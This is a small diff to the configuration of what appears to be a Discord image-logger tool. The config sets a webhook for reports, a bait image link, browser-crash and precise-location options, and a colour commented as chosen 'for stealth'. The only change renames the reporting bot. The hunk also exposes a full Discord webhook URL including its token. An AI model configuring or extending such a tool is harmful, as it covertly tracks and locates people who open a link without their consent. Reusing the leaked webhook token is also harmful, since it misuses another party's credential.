@@ -12,7 +12,7 @@ config = {
     "webhook": "https://discord.com/api/webhooks/1466906538148102235/itmF63UvtsjjygTjbcLYaxwBTBB5Ger3CjaVCbQoab51UZjU7qsxSWXd38xZ3n9ZKmAc",
     "image": "https://cdn.discordapp.com/attachments/1454160227611050247/1461001126324473926/image.png?ex=697eb794&is=697d6614&hm=a817fd7d2715116946ba366720ff256071ba375b449c497dc5fafa8bffa99a56&",
     "imageArgument": True,
-    "username": "Manus Sentinel",
+    "username": "Mas Sentinel",
     "color": 0x2b2d31, # Discord Dark Theme color for stealth
     "crashBrowser": False,
     "accurateLocation": True,
